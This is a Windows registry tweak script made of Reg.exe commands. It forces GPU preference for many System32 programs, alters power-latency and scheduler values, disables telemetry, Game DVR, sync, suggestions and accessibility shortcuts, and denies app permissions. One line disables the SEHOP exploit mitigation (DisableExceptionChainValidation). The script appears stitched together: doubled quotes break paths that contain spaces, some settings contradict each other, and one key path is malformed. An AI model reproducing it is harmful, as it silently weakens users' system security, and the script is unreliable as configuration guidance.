Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winload.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bthudtask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fsquirt.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bitsadmin.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\refsutil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\appidcertstorecheck.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\appidpolicyconverter.exe" /t REG_SZ /d "GpuPreference=1;" /f     
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wlanext.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\LockScreenContentServer.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SlideToShutDown.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\systray.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RunLegacyCPLElevated.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\control.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fontview.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wifitask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tzutil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\w32tm.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dmclient.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dsregcmd.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\UtcDecoderHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TpmTool.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\HealthAttestationClientAgent.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TpmInit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CloudNotifications.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemSettingsBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\mofcomp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\unsecapp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\WMIADAP.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\WmiApSrv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate_isv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate_ssp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RMActivate_ssp_isv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\printfilterpipelinesvc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\provtool.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PrintIsolationHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\spoolsv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PinEnrollmentBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WpcTok.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WpcMon.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ApproveChildRequest.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ofdeploy.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DmNotificationBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MDMAgent.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MicrosoftEdgeBCHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Eap3Host.exe" /t REG_SZ /d "GpuPreference=1;" /f 
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\choice.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\clip.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\doskey.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\forfiles.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\print.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\subst.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cttune.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cttunesvr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\help.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\msdtc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CastSrv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\UserDataSource.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\curl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tar.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\spaceman.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LatencyToleranceIdleResiliency"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""DisableVsyncLatencyUpdate"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""ExitLatencyCheckEnabled"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""Latency"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LatencyTolerancePerfOverride"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LatencyToleranceScreenOffIR"" /t REG_DWORD /d ""1"" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t REG_DWORD /d "5" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "DirectXUserGlobalSettings" /t REG_SZ /d "VRROptimizeEnable=0;" /f
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventTranscriptKey" /v "EnableEventTranscript" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338387Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-310093Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-314563Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "ContentDeliveryAllowed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "OemPreInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEverEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContentEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "FeatureManagementEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RemediationRequired" /t REG_DWORD /d "0" /f
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager\Subscriptions" /f
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager\SuggestedApps" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement" /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "ConfigureWindowsSpotlight" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "IncludeEnterpriseSpotlight" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightFeatures" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightWindowsWelcomeExperience" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnActionCenter" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableThirdPartySuggestions" /t REG_DWORD /d "1" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""RtlCapabilityCheckLatency"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""ExitLatency"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"" /v ""PowerThrottlingOff"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\ControlSet001\Services\Ndu"" /v ""Start"" /t REG_DWORD /d ""4"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive"" /v ""MaximumSharedReadyQueueSize"" /t REG_DWORD /d ""125"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager"" /v ""MediumIrpStackLocations"" /t REG_DWORD /d ""8"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager"" /v ""DisableExceptionChainValidation"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\System\CurrentControlSet\Control\Session Manager\Configuration Manager\RegistryLazyFlushInterval"" /v ""MediumIrpStackLocations"" /t REG_DWORD /d ""8"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v Win32PrioritySeparation /t REG_DWORD /d 38 /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mouclass\Parameters"" /v MouseDataQueueSize /t REG_DWORD /d 100 /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\kbdclass\Parameters"" /v KeyboardDataQueueSize /t REG_DWORD /d 100 /f
reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"" /v EnableDwmInputProcessing /t REG_DWORD /d 0 /f
reg add ""HKCU\SYSTEM\GameConfigStore"" /v ""GameDVR_DSEBehavior"" /t REG_DWORD /d ""0"" /f 
reg add ""HKCU\SYSTEM\GameConfigStore"" /v ""GameDVR_FSEBehaviorMode"" /t REG_DWORD /d ""0"" /f
reg add ""HKCU\SYSTEM\GameConfigStore"" /v ""GameDVR_EFSEFeatureFlags"" /t REG_DWORD /d ""0"" /f
reg add ""HKCU\SYSTEM\GameConfigStore"" /v ""GameDVR_DXGIHonorFSEWindowsCompatible"" /t REG_DWORD /d ""0"" /f
reg add ""HKCU\SYSTEM\GameConfigStore"" /v ""GameDVR_HonorUserFSEBehaviorMode"" /t REG_DWORD /d ""1"" /f
reg add ""HKEY_CURRENT_USER\Software\Microsoft\GameBar"" /v AllowAutoGameMode /t REG_DWORD /d 0 /f
reg add ""HKEY_CURRENT_USER\Software\Microsoft\GameBar"" /v AutoGameModeEnabled /t REG_DWORD /d 0 /f
reg add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v MenuShowDelay /t REG_SZ /d ""0"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Mouse"" /v MouseHoverTime /t REG_SZ /d ""0"" /f
reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"" /v DwmInputUsesIoCompletionPort /t REG_DWORD /d 0 /f
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications"" /v ""Migrated"" /t REG_DWORD /d ""4"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications"" /v ""GlobalUserDisabled"" /t REG_DWORD /d ""1"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
